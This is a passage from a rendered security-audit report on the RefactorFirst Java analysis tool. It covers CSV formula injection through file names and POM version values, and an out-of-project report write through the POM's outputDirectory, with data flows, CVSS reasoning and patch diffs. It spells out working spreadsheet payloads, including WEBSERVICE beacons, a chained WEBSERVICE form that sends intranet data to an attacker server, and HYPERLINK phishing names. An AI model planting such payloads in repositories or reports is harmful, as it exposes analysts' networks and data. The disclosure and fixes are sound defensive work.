The same value is concatenated into the output file name `RefFirst_P<name>_PV<version>_PD<date>.csv` — the only
constraint on the payload: it must be a legal file name on the generating platform (CHAR ()-constructed payloads are
legal on all platforms; DDE spellings are legal on Linux/macOS).

### Step 5 — `report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java:44-77`

Git precondition: for a normally cloned repo analyzed at its root, projectBaseDir equals parentOfGitDir (:73-77), so
execution proceeds past the checks (the no-git fallback at :63-70 is an alternative, weaker write path).

### Step 6 — `cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java:62-74,208-221`

God-class precondition: runPmdAnalysis () runs pmd-java 7.0.0-rc4's built-in category/java/design.xml ruleset (:78) over
the whole repo; getGodClasses () keeps violations whose rule name contains "GodClass" — an authored bloated class
(committed once, so it has git history) deterministically produces ≥1 row.

### Step 7 — `report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java:121`

Sink: inside the data-row loop, `contentBuilder.append(projectVersion).append(",")` places the raw value as cell #1 (the
"Ver" column) of every data row; each row begins at a true line start (previous row ends with the appended "\n" at :123,
header at :116), so a leading `=`/`+`/`-`/`@` sits exactly at the cell boundary spreadsheet applications require for
formula evaluation.

### Step 8 — `report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java:208-212`

addsRow () appends the remaining cells with a bare `append(rowData).append(",")` loop — no CSV quoting of any field and
no formula-trigger neutralization anywhere in the module (the only escaper, SimpleHtmlReport.escapeHtmlLabel, is never
invoked here).

### Step 9 — `report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java:128`

writeReportToDisk (outputDirectory, filename, contentBuilder.toString ()) hands the verbatim string to the writer.

### Step 10 — `report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java:13-37`

ReportWriter.writeReportToDisk writes the string byte-for-byte via Files.newBufferedWriter (IOExceptions around
createNewFile/newBufferedWriter are swallowed and logged — a payload containing "/" fails here silently, which is why
payloads avoid platform-illegal file-name characters rather than being blocked).

### Step 11 — `consumer (outside the codebase)`

The analyst opens `RefFirst_P…_PV…_PD….csv` in Excel/LibreOffice/Google Sheets; the leading-`=` cell is entered as a
formula at import: WEBSERVICE issues an attacker-directed outbound HTTP request from the analyst's machine, HYPERLINK
renders attacker-chosen clickable content, DDE spellings attempt user-prompted OS command execution — CWE-1236 impact
lands on the machine that opens the report.

## Fix / patch notes

diff --git a/report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java
b/report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java ---
a/report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java +++
b/report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java @@ -61,9 +61,9 @@
"Done! No Git repository found!  Please initialize a Git repository and perform an initial commit."); contentBuilder
.append ("No Git repository found in project ")

-                    .append(projectName)

+                    .append(sanitizeCsvCell(projectName))
                     .append(" ")

-                    .append(projectVersion)

+                    .append(sanitizeCsvCell(projectVersion))
                     .append(". ");
             contentBuilder.append("Please initialize a Git repository and perform an initial commit.");
             writeReportToDisk(outputDirectory, filename, contentBuilder.toString());

@@ -99,9 +99,9 @@ if (rankedDisharmonies.isEmpty ()) { contentBuilder .append ("Congratulations!  ")

-                    .append(projectName)

+                    .append(sanitizeCsvCell(projectName))
                     .append(" ")

-                    .append(projectVersion)

+                    .append(sanitizeCsvCell(projectVersion))
                     .append(" has no God classes!");
             log.info("Done! No God classes found!");

@@ -118,7 +118,7 @@ for (RankedDisharmony rankedDisharmony : rankedDisharmonies) { final String[] rankedDisharmonyData =
getDataList (rankedDisharmony, showDetails);

-            contentBuilder.append(projectVersion).append(",");

+            contentBuilder.append(sanitizeCsvCell(projectVersion)).append(",");
             addsRow(contentBuilder, rankedDisharmonyData);
             contentBuilder.append("eol" + "\n");
         }

@@ -207,10 +207,25 @@

     private void addsRow(StringBuilder contentBuilder, String[] rankedDisharmonyData) {
         for (String rowData : rankedDisharmonyData) {

-            contentBuilder.append(rowData).append(",");

+            contentBuilder.append(sanitizeCsvCell(rowData)).append(",");
         }
  }

+ /**
+     * Neutralizes spreadsheet formula triggers (CWE-1236). Every cell rendered into the CSV
+     * report derives from the analyzed repository (POM name/version, PMD-detected file names,
+     * paths, class names) and must be treated as untrusted: a value beginning with =, +, -, @,
+     * tab or CR -- or with such a character at the start of any embedded line -- is interpreted
+     * as a formula by Excel/LibreOffice/Google Sheets when the report is opened. Prefixing a
+     * single quote forces text interpretation.
+     */
+ static String sanitizeCsvCell (String value) {
+        if (value == null || value.isEmpty()) {
+            return value;
+        }
+        return value.replaceAll("(?m)(^|[\\r\\n])([=+@\\-\\t\\r])", "$1'$2");
+ }
+

public String getOutputNamePrefix () { // This report will generate simple-report.html when invoked in a project with
`mvn site`
return "RefFirst";

## References

- https://cwe.mitre.org/data/definitions/1236.html
- https://owasp.org/www-community/attacks/CSV_Injection
- https://github.com/gitleaks/gitleaks/pull/2237
- https://learn.microsoft.com/en-us/security-updates/securityadvisories/2017/170021

---

_Rendered from original VulnHunter / VulnForge `report.yaml` by OpenVuln._

## [medium] CSV report generator (CsvReport.addsRow) writes analyzed-repo file names/paths unquoted and unneutralized into spreadsheet cells, enabling CSV formula injection on the machine that opens the report (beacon/client-side request forgery from the analyst workstation, chained WEBSERVICE exfiltration of intranet HTTP responses, HYPERLINK phishing; no code execution) — live on every goal-carrying release 0.4.0-0.8.0 and version-pinnable by the attacker via the analyzed POM for mvn-site/version-less invocations; 0.9.0+/audited snapshot currently NPE-blocked

- key: `BUG-R2-S2-A3-H2`
- disclosure: owner_only
- cwe: CWE-1236
- file: `../cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java`

# CSV report generator (CsvReport.addsRow) writes analyzed-repo file names/paths unquoted and unneutralized into spreadsheet cells, enabling CSV formula injection on the machine that opens the report (beacon/client-side request forgery from the analyst workstation, chained WEBSERVICE exfiltration of intranet HTTP responses, HYPERLINK phishing; no code execution) — live on every goal-carrying release 0.4.0-0.8.0 and version-pinnable by the attacker via the analyzed POM for mvn-site/version-less invocations; 0.9.0+/audited snapshot currently NPE-blocked

- **Project:** refactorfirst/RefactorFirst
- **Finding key:** BUG-R2-S2-A3-H2
- **CWE:** CWE-1236
- **CVSS:** 6.1 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`)
- **EV priority:** P1
- **EV score:** 6
- **PoC status:** reproduced
- **EXP status:** confirmed
- **Affected versions:** dynamically confirmed end-to-end (formula-bearing CSV produced) on EVERY released version
  carrying the csvreport goal: 0.4.0, 0.5.0, 0.6.0, 0.6.2, 0.7.0, 0.7.1, 0.8.0 (all pin pmd-java 7.0.0-rc4 and the
  byte-identical CsvReport.addsRow sink); NOT currently exploitable via explicit-version invocation at the audited
  0.10.0-SNAPSHOT (commit 65d3bef) nor released 0.9.0: GodClass's metric-parsing regex ATFD= (\d+), WMC= (\d+), TCC=
  ([\d.]+) never matches PMD 7.0.0-rc4's violation description 'Possible God Class (WMC=.., ATFD=.., TCC=..%)'
  (field-order mismatch), so the csvreport goal crashes with a NullPointerException in GodClassRanker.rankWmc before any
  row is assembled whenever the analyzed repo contains a god class (the sink code itself is unchanged and the channel
  re-arms when that unrelated regression is fixed). EXP-round refinement (findings/BUG-R2-S2-A3-H2/exp/): the attacker
  can RESTORE version control for two invocation styles — plain 'mvn site' in the attacker's clone (the analyzed POM's
  site-phase <execution> binding runs the attacker-declared 0.8.0 csvreport as part of the victim's routine site build;
  verified BUILD SUCCESS with the formula CSV in target/site; a plugin declared without an execution is NOT bound) and
  the version-less goal invocation 'mvn org.hjug.refactorfirst.plugin:refactor-first-maven-plugin:csvreport' (Maven
  resolves the version from the attacker's POM declaration — verified 0.8.0 selected and the payload report produced;
  with no declaration it resolves 0.9.0/LATEST and NPEs). Standalone CLI vector bounded to 0.6.2-and-earlier: cli
  0.7.1/0.8.0/0.9.0 cannot start at all (shipped picocli DuplicateOptionAnnotationsException). Uncommitted working-tree
  payload files produce rows only on <=0.7.1; on 0.8.0 such a file crashes the whole goal (NPE in
  ChangePronenessRanker.rankChangeProneness: changeCountsByTimeStamps.get (Integer.MAX_VALUE).intValue () — the ==0
  guard misses fileLog's zero-commit sentinel) — delivery via clone/PR (committed files) works on all live versions

## Exploitability rationale

R:L — the attacker must be the author of the repository the victim analyzes (file-control class, delivered remotely via
clone/PR/archive); no network position, credentials, or local privileges are needed, and no special POM configuration is
required for this vector: the payload rides the repository's own file names, so it fires even when the victim generates
the report with their own benign project name/version values (EXP-verified: a CLI run with -p my-analysis -v 9.9.9
produces a report whose Ver column is the benign 9.9.9 while every Class cell is the payload formula — the
differentiator vs. the sibling POM-value source BUG-R2-S2-A3-H1, which such overrides silence). E:C — the sink is on the
default path of every CSV report (the file name is the "Class" cell of every data row in both simple and detailed modes,
no option disables it, and any single God-Class file (>47 weighted methods, >5 foreign-data accesses, <1/3 cohesion —
trivially generated)
produces a row), and the channel is dynamically live on ALL released versions that carry the csvreport goal: 0.4.0
through 0.8.0 (eight consecutive releases, each verified end-to-end with formula-bearing CSVs). The analyzed POM
additionally lets the attacker SELECT the plugin version for two invocation styles: plain `mvn site` in the attacker's
clone (site-phase <execution>
binding — verified: refactor-first-maven-plugin:0.8.0:csvreport (default) runs as part of the victim's routine site
build and writes the CSV into target/site) and the version-less goal invocation
`mvn org.hjug.refactorfirst.plugin:refactor-first-maven-plugin:csvreport` (Maven resolves the version from the
attacker's POM declaration — verified 0.8.0 selected and the payload report produced; with no declaration in the POM it
resolves 0.9.0/LATEST and NPEs). Not E:D because the CSV report is an optional, non-default report type (CLI default and
README headline are HTML) and the currently documented explicit-version invocation is broken on the latest line: on
0.9.0 and the audited snapshot the GodClass metric-parsing regex never matches PMD 7.0.0-rc4's message order, so
csvreport crashes with an NPE before any row is written there (the sink code is unchanged and the channel re-arms when
that unrelated regression is fixed). The standalone CLI cannot start at all on 0.7.1-0.9.0 (shipped picocli
DuplicateOptionAnnotationsException), bounding the CLI vector to 0.6.2-and-earlier. C:D — pure deterministic string
propagation with zero validation, filtering or quoting on the whole path; the payload bytes round-trip verbatim through
PMD's percent-encoding because every payload character (= ( ) & , . letters digits) is URI-path-legal, and the 255-byte
file-name limit is only a per-cell constraint: payload cells may be cell-reference formulas (=WEBSERVICE (B3&...&B14))
that compose a URL from CHAR () chains held in other rows (EXP-verified:
a 267-char URL assembled from 12 payload files, fetched by the real spreadsheet engine), and root-level payload files
yield a second formula cell each in detailed mode (the Full Path cell). I:S — the impact lands on the report consumer:
an attacker-chosen HTTP request issued from the analyst's workstation when the report is opened in a spreadsheet
(beacon/SSRF from a trusted network position — desktop Excel evaluates WEBSERVICE on open per the documented
CSV-injection primitive, not dynamically testable in this Linux sandbox; LibreOffice gates imported-CSV WEBSERVICE
behind its external-content setting, one interaction; Google Sheets IMPORT* variants fetch from platform infrastructure,
not the workstation). Chained WEBSERVICE forms exfiltrate intranet HTTP responses to the attacker — engine-verified:
LibreOffice 7.4.7.2 itself executed the exact landed two-hop formula (inner GET fake-intranet /secret -> SECRET123,
outer GET fake-C2 /c2x?d=SECRET123), bounded by consumer URL-length limits (~2 KB class) and URL-safe responses;
HYPERLINK forms render attacker-chosen phishing links inside the trusted artifact. Host-level code execution (DDE) is
not reachable because the formula trigger characters required by DDE payloads (| space " \) are percent-encoded away —
hence significant-but-sub-RCE impact. Full impact-assessment record: findings/BUG-R2-S2-A3-H2/exp/exp.md.

## Code anchors

| File                                                                            | Line | Function                                 |
|---------------------------------------------------------------------------------|-----:|------------------------------------------|
| `../cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java` |   68 | `runPmdAnalysis`                         |
| `../cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java` |  211 | `getGodClasses`                          |
| `../cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java` |  457 | `getFileName`                            |
| `../cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java` |  462 | `canonicaliseURIStringForRepoLookup`     |
| `../change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java`          |  141 | `fileLog`                                |
| `../cost-benefit-calculator/src/main/java/org/hjug/cbc/RankedDisharmony.java`      |   51 | `RankedDisharmony(GodClass, ScmLogInfo)` |
| `../report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java`             |  145 | `getDataList`                            |
| `../report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java`             |  168 | `getDataList`                            |
| `../report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java`             |  208 | `addsRow`                                |
| `../report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java`          |   32 | `writeReportToDisk`                      |

## Background

RefactorFirst (org.hjug.refactorfirst) is a developer/CI static-analysis tool that ranks code disharmonies (God Classes,
coupled classes, cycles) of a Java/Kotlin repository by combining PMD source metrics with JGit change history, and emits
HTML, CSV and JSON reports. Its documented workflow points it at third-party/cloned repositories — the primary
untrusted-input channel. The CSV report (CLI `-t CSV`, Maven `csvreport` goal) writes one row per ranked disharmony; the
row's "Class" cell is the analyzed file's name and the "Full Path" cell (detailed mode, `-d`) is its repository-relative
path. The report's entire purpose is to be opened in a spreadsheet application (Excel/LibreOffice/Google Sheets), and
the output lands in the analyzed repo's target/site directory or the configured output directory where the analyst picks
it up.

## Description

Every cell of the CSV is written by raw StringBuilder concatenation with a trailing comma and no quoting whatsoever
(CsvReport.addsRow, CsvReport.java:208-212); the file name/path values receive no formula-neutralization (no leading
apostrophe, no escaping). The values originate from the analyzed repository's working tree, which is fully
attacker-controlled when a victim analyzes a cloned third-party repository: CostBenefitCalculator.runPmdAnalysis (line
68-69) feeds every regular file under the repository to PMD; PMD 7.0.0-rc4 accepts any file whose name ends in ".java"
(extension = substring after the last dot) and reports violations against the file's URI. The URI string is computed as
path.normalize ().toUri ().toString () (pmd-core FileId.fromPath), which percent-encodes only characters outside the RFC
2396 path set — the characters needed for spreadsheet formulas (= + - @ ( ) & , ! $ : ; ' * . letters digits) all
survive verbatim. CostBenefitCalculator.getFileName/canonicaliseURIStringForRepoLookup (lines 457-467) then strip only
the file://<repo>/ prefix, leaving the encoded-but-intact name as GodClass.fileRepoPath. GitLogReader.fileLog (lines
141-143) returns a ScmLogInfo even for paths with zero commits, so uncommitted working-tree files still produce report
rows on releases <= 0.7.1 (EXP-verified) — but on 0.8.0 such a file instead crashes the whole goal before any row is
written (ChangePronenessRanker NPE, see affected_versions), so the reliable delivery is clone/PR with committed files
(which match the git tree path directly). RankedDisharmony (lines 51-53) copies the path verbatim and derives fileName
as the last path segment. CsvReport.getDataList places fileName as the Class cell of every data row (lines 145 and 155,
simple and detailed modes) and the full path as the last cell of detailed rows (line 168). The mandatory ".java" suffix
on the file name does not protect the payload: a single comma inside the file name splits the cell in every spreadsheet
CSV parser, so a file named "=WEBSERVICE (CHAR (104)&...),q.java" produces a Class cell containing exactly the complete
single-argument formula "=WEBSERVICE (CHAR (104)&...)" (each CHAR (n) takes one argument and WEBSERVICE takes one, so
the formula body itself contains no comma, and CHAR () reconstructs any character at evaluation time — no quotes,
slashes or pipes need to survive the encoding), while the benign "q.java" fragment lands as inert text in the next
column. The payload characters are legal file-name bytes on Linux, macOS and Windows alike, so the file materializes at
checkout on any victim OS. The projectVersion cell appended outside addsRow (CsvReport.java:121) is a separate injection
source with its own prerequisites and is not part of this report's scope.

## Attack

The attacker authors a repository (public repo, PR, or archive with committed files) containing payload-named god-class
files and a valid git history. The victim clones it and runs a RefactorFirst CSV report invocation inside it — EXP-round
verified invocation matrix: (a) explicit-version goal on any release 0.4.0-0.8.0, e.g.
`mvn org.hjug.refactorfirst.plugin:refactor-first-maven-plugin:0.8.0:csvreport` in the repo root; (b) plain `mvn site` —
the attacker's POM binds the csvreport goal to the site phase with version 0.8.0, so the victim's routine site build
runs the attacker-chosen version and deposits the CSV in target/site/ as a build artifact (the CI flow: an analyst
downloads and opens an artifact from a build that never executed any of the repository's code); (c) the version-less
goal `mvn org.hjug.refactorfirst.plugin:refactor-first-maven-plugin:csvreport` — Maven resolves the version from the
attacker's POM declaration; (d) the standalone CLI — only 0.6.2-and-earlier can start (0.7.1+ ship a picocli startup
bug), and there the file-name channel survives benign -p/-v overrides (verified: Ver column shows the victim's own
values while every Class cell is the payload formula). Explicit-version invocation of 0.9.0+ (the current README form)
currently crashes with the unrelated GodClass NPE before any row is written. The tool analyzes the working tree, emits
RefFirst_P<name>_PV<version>_PD<date>.csv, and logs "View the report at target/site/...". When the victim opens the CSV
in a spreadsheet application — the report's intended consumption — the Class-column cell is parsed as a formula: desktop
Excel evaluates WEBSERVICE on open (documented CSV-injection primitive; the fetch-dependent claims were engine-verified
in LibreOffice and a strict local evaluator against loopback stand-ins in this Linux-only sandbox), issuing an
attacker-chosen HTTP GET from the victim's workstation (beacon/SSRF from a trusted corporate network position; the
chained form =WEBSERVICE (outer&WEBSERVICE (inner)) exfiltrates intranet HTTP responses through the outer URL — executed
end-to-end by LibreOffice on the exact landed formula bytes); LibreOffice gates imported-CSV WEBSERVICE behind its
external-content setting (one interaction) and evaluates HYPERLINK immediately; Google Sheets IMPORT* variants fetch
from platform infrastructure rather than the workstation. HYPERLINK renders a phishing link in every consumer. No DDE
prompt appears (WEBSERVICE is not gated by the DDE warning; DDE-class payloads are unreachable through this channel
anyway — their trigger characters are percent-encoded away), and the locally generated file carries no Mark-of-the-Web,
so no Protected View intervenes (a CI artifact downloaded via browser may carry MotW — one more click). Precondition is
solely the A1 attacker position (analyzed-repo author) plus the victim running the report and opening the artifact they
generated — the same trust model and impact class as the published gitleaks CSV-injection issue (PR #2237) for the
identical tool category.

### Payload

A .java file (at the repository root or any directory) whose name is a comma-free spreadsheet formula followed by one
comma and a benign .java-ending fragment, e.g. "=WEBSERVICE (CHAR (104)&CHAR (116)&CHAR (116)&CHAR (112)&CHAR (58)&CHAR
(47)&CHAR (47)&CHAR (101)),q.java" (URL built entirely from CHAR () codes — all characters URI-path-legal). The file
content is a mechanically generated class exceeding the PMD GodClass thresholds (WMC >= 47, ATFD > 5, TCC < 1/3,
thresholds verified in the pinned pmd-java 7.0.0-rc4 GodClassRule). Variants: "=HYPERLINK (CHAR (...)),q.java" (phishing
link), "=WEBSERVICE (CHAR (...)&WEBSERVICE (CHAR (...))),q.java" (chained intranet exfiltration), and for Google Sheets
"=IMPORTDATA (CHAR (...)),q.java" / "=IMAGE (CHAR (...)),q.java". EXP-round variants (dynamically verified, see
exp/exp.md): (1) cell-reference composition — a payload file named "=WEBSERVICE (B3&B4&...&B14),f1.java" whose
Class-cell formula references the CHAR ()-chain Class cells of OTHER payload rows, assembling a URL of arbitrary total
length from per-file pieces (a 267-char URL from 12 files verified — defeats the 255-byte per-name limit; the
metrics/git-history-driven row order is attacker-determinable, so the references aim correctly); (2) repo-ROOT
placement — a payload file at the repository root makes the detailed-mode "Full Path" cell the file name itself, a
second complete formula per file (verified in the generated report and as CellContentType.FORMULA in LibreOffice
import).

## Data flow

### Step 1 — `cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java:68-69`

runPmdAnalysis () walks the analyzed repository's working tree (Files.walk + Files::isRegularFile) and adds every
regular file to PMD's file list — no name filtering; committed and uncommitted files alike are analyzed.

### Step 2 — `pmd-core 7.0.0-rc4: FileCollector.addFile / LanguageVersionDiscoverer.getExtension`

PMD's language detection takes the substring after the last '.' of the file name ("java"), so any name ending in ".java"
is parsed as Java source; the parser reads only file content, never validating the name.

### Step 3 —

`pmd-java 7.0.0-rc4: category/java/design.xml (rule GodClass, class GodClassRule; thresholds WMC>=47, ATFD>5, TCC<0.3333)`

A crafted class exceeds the GodClass thresholds; the rule reports a violation whose FileId carries uriString =
path.normalize ().toUri ().toString () — percent-encoding (RFC 2396) that leaves the formula charset (= ( ) & , .
letters digits) verbatim.

### Step 4 — `cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java:211-216`

getGodClasses () filters rule violations by name contains ("GodClass") and builds GodClass (className from AST,
getFileName (violation), ...) — the file name enters the disharmony model.

### Step 5 — `cost-benefit-calculator/src/main/java/org/hjug/cbc/CostBenefitCalculator.java:457-467`

getFileName () → canonicaliseURIStringForRepoLookup () strips only the "file://<repo>/" prefix from the violation URI
string; no decoding, no sanitization — the payload name survives intact as GodClass.fileRepoPath.

### Step 6 — `change-proneness-ranker/src/main/java/org/hjug/git/GitLogReader.java:132-145`

fileLog (path) queries git history; even with commitCount == 0 (uncommitted working-tree file) it returns a ScmLogInfo
carrying the passed path verbatim, so the row is not dropped for missing git history on <= 0.7.1 (dynamically verified:
payload row with commitCount 0). EXP correction for 0.8.0: an uncommitted working-tree payload file instead crashes the
whole goal before any row is written — ChangePronenessRanker.rankChangeProneness does changeCountsByTimeStamps.get
(earliestCommit).intValue () and fileLog's zero-commit sentinel earliestCommit = Integer.MAX_VALUE misses the == 0 guard
(NPE); clone/PR delivery (committed files) works on every live version.

### Step 7 — `cost-benefit-calculator/src/main/java/org/hjug/cbc/RankedDisharmony.java:50-53`

The RankedDisharmony constructor copies path = scmLogInfo.getPath () and fileName = Path.of (path).getFileName ()
.toString () — both preserve the payload string (a comma inside a single path segment does not affect Path.of parsing).

### Step 8 — `report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java:145,155,168`

getDataList () places fileName as the "Class" cell of every data row (simple and detailed modes) and path as the "Full
Path" cell of detailed rows.

### Step 9 — `report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java:121-123,208-212`

Row assembly appends projectVersion + "," then addsRow () appends every cell raw with a trailing comma — no RFC 4180
quoting, no formula neutralization. The payload's single comma therefore acts as a cell separator for the consumer: the
Class cell receives the complete formula "=WEBSERVICE (CHAR (...))" at a true cell boundary, and the trailing "q.java"
fragment lands inertly in the next column — defeating the mandatory .java-suffix constraint.

### Step 10 — `report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java:31-38`

writeReportToDisk () writes the accumulated content verbatim to RefFirst_P..._PD....csv in the output directory.

### Step 11 — `consumer: spreadsheet application opening the CSV`

Excel (default double-click open; locally generated file → no Mark-of-the-Web/Protected View) evaluates the "="-prefixed
cell on open: WEBSERVICE assembles the URL from CHAR () codes (and from referenced cells, for the composition variants)
and issues an HTTP GET from the analyst's machine; the chained form =WEBSERVICE (CHAR (...)&WEBSERVICE (CHAR (...)))
exfiltrates intranet responses via the outer URL. LibreOffice Calc imports the same cells as live formulas (all payload
Class cells CellContentType.FORMULA) but gates WEBSERVICE fetches of freshly imported CSVs behind its external-content
setting (Err:540, one interaction) — the identical formula bytes evaluated in any other document context complete the
full fetch chain (dynamically executed: inner GET /secret + outer GET /c2x?d=<body> issued by LibreOffice itself).
Google Sheets (import) evaluates the IMPORTDATA/IMAGE variants at import time, but the fetch is issued from Google's
import infrastructure, not the analyst's workstation (beacon semantics only).

## Fix / patch notes

diff --git a/report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java
b/report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java ---
a/report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java +++
b/report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java @@ -205,9 +205,31 @@ public class CsvReport { }

     private void addsRow(StringBuilder contentBuilder, String[] rankedDisharmonyData) {
         for (String rowData : rankedDisharmonyData) {

-            contentBuilder.append(rowData).append(",");

+            contentBuilder.append(escapeCsvCell(rowData)).append(",");
         }
  }
+
+ /**
+     * Escapes a value for RFC 4180 CSV output and neutralizes spreadsheet
+     * formula injection (CWE-1236): values beginning with a formula trigger
+     * character (= + - @ tab CR) are prefixed with a single quote so that
+     * spreadsheet applications render them as text instead of evaluating
+     * them as formulas.
+     */
+ private static String escapeCsvCell (String value) {
+        if (value == null) {
+            return "";
+        }
+        String cell = value.replace("\"", "\"\"");
+        if (!cell.isEmpty()) {
+            char first = cell.charAt(0);
+            if (first == '=' || first == '+' || first == '-' || first == '@'
+                    || first == '\t' || first == '\r') {
+                cell = "'" + cell;
+            }
+        }
+        return "\"" + cell + "\"";
+ } }

## References

- https://cwe.mitre.org/data/definitions/1236.html
- https://owasp.org/www-community/attacks/CSV_Injection
- https://github.com/gitleaks/gitleaks/pull/2237
- https://cwe.mitre.org/data/definitions/1287.html

---

_Rendered from original VulnHunter / VulnForge `report.yaml` by OpenVuln._

## [medium] Maven-plugin report goals (htmlReport/simpleHtmlReport/jsonreport/csvreport) take their write directory from the analyzed project's own POM <reporting><outputDirectory> and write report files to that attacker-chosen location (arbitrary directory creation + out-of-project file write/truncation), bypassing target/site entirely

- key: `BUG-R2-S2-A5-H1`
- disclosure: owner_only
- cwe: CWE-22
- file: `../refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstHtmlReport.java`

# Maven-plugin report goals (htmlReport/simpleHtmlReport/jsonreport/csvreport) take their write directory from the analyzed project's own POM <reporting><outputDirectory> and write report files to that attacker-chosen location (arbitrary directory creation + out-of-project file write/truncation), bypassing target/site entirely

- **Project:** refactorfirst/RefactorFirst
- **Finding key:** BUG-R2-S2-A5-H1
- **CWE:** CWE-22
- **CVSS:** 4.4 (`CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L`)
- **EV priority:** P1
- **EV score:** 7
- **PoC status:** reproduced
- **EXP status:** downgraded
- **Affected versions:** confirmed on the audited snapshot (commit 65d3bef1, 0.10.0-SNAPSHOT) and on the released 0.9.0
  the README pins (EXP-R6-E12: plugin resolved from Maven Central, identical out-of-repo write on the direct htmlReport
  goal and inside the documented `clean test simpleHtmlReport` CI flow); the output-directory derivation
  `project.getModel().getReporting().getOutputDirectory().replace(...)` is hard-coded in all four write-producing mojos
  of the current sources; all released versions sharing this mojo pattern are affected

## Exploitability rationale

Reachability R:L — the attacker must control the analyzed repository's root POM (the
`<reporting><outputDirectory>` element): delivered as any cloned/published third-party repo, which is the tool's
advertised primary use. Always requires the victim to fetch the repo and run a report goal — file-control class, not
unattended network reachability. Exposure E:D — all four write-producing mojos derive the write directory the same
hard-coded way; the write executes at the end of every goal invocation, no option gates it, no plugin declaration is
needed in the malicious POM, and the released 0.9.0 the README pins carries the identical behavior (EXP-R6-E12: plugin
resolved from Maven Central, out-of-repo write on the direct htmlReport goal and inside the documented
`clean test simpleHtmlReport` CI flow); for
`csvreport` even a pom-only repo (no `.git`, no sources) reaches the write via its no-git early-exit branch
(POC-verified); the other three goals need jgit to find a
`.git`, which every real cloned repo has (git-less runs NPE before the write — see poc/poc.md correction 3). Certainty
C:D — deterministic string pass-through with no memory/timing dependence: model interpolation turns the element into a
basedir- anchored absolute path (relative and empty values included — POC-verified on Maven 3.8.7), the model validator
performs no path checks, the `.replace()` prefix strip matches a literal that cannot occur post-interpolation (dead
code), and the sink does raw `dir + File.separator + filename` concatenation on an absolute path; the external
dependency (Maven 3 model semantics) was re-confirmed empirically in the POC with two wording corrections (basedir
anchoring instead of JVM CWD; empty element yields an in-repo `<basedir>/<filename>` write, not a filesystem-root write)
recorded in poc/poc.md. Impact I:S — the real-scenario assessment (EXP-R6-E12, 39/39 checks in simulated
developer-workstation and CI environments)
confirmed the primitive fires silently (BUILD SUCCESS, exit 0, two hard-coded
"Done! View the report at target/site/…" log lines) on the default documented flow and delivers: arbitrary
directory-tree creation with the victim's privileges (unconditional mkdirs), a planted report file at any
victim-writable path (semi-controlled content embedding POM name/version, git remote URL and repo-derived class/file
names — the confirmed A1/A2 injection sources), username-independent placement via the traversal shape (clone-depth
knowledge only — the same repo planted into two differently-named victim homes), silent same-name truncation of
previously published reports, and — where the victim runs a served user-writable webroot, or a persistent/self-hosted CI
publishes to a served artifacts directory — a planted page that executes its embedded script in that origin (verified in
real Chromium). The S grade is carried by these demonstrated chains; standalone the placement is typically inert and the
clobbering is fixed-filename-only (no modification of arbitrary existing victim data), and the high-impact outcomes are
composition-owned: arbitrary-name/path overwrite via a committed symlink is sibling H3's capability (demonstrated
composed with this finding: a victim .bashrc truncated and rewritten through the link, same inode preserved), CSV
filename stem control is H2's, and the scripted content is the A1/A2 family's — CVSS for this finding alone is
accordingly scored I:L (4.4).

## Code anchors

| File                                                                                                | Line | Function            |
|-----------------------------------------------------------------------------------------------------|-----:|---------------------|
| `../refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstHtmlReport.java`       |   71 | `execute`           |
| `../refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstSimpleHtmlReport.java` |   71 | `execute`           |
| `../refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstMavenJsonReport.java`  |   33 | `execute`           |
| `../refactor-first-maven-plugin/src/main/java/org/hjug/mavenreport/RefactorFirstMavenCsvReport.java`   |   43 | `execute`           |
| `../report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java`                              |   15 | `writeReportToDisk` |
| `../report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java`                              |   21 | `writeReportToDisk` |
| `../report/src/main/java/org/hjug/refactorfirst/report/ReportWriter.java`                              |   31 | `writeReportToDisk` |
| `../report/src/main/java/org/hjug/refactorfirst/report/SimpleHtmlReport.java`                          |  113 | `execute`           |
| `../report/src/main/java/org/hjug/refactorfirst/report/CsvReport.java`                                 |   69 | `execute`           |
| `../report/src/main/java/org/hjug/refactorfirst/report/json/JsonReportExecutor.java`                   |   55 | `execute`           |

## Background

RefactorFirst is a developer/CI-side static-analysis tool shipped as a Maven plugin (plus a CLI) whose advertised
primary use is running a report goal against a cloned third-party repository ("Run the command below in your Java
project's top-level directory … This command will analyze Maven and non-Maven projects", README.md:13-17; a dummy-POM
flow is documented for non-Maven projects). The plugin exposes four goals that write report files to disk through one
shared sink,
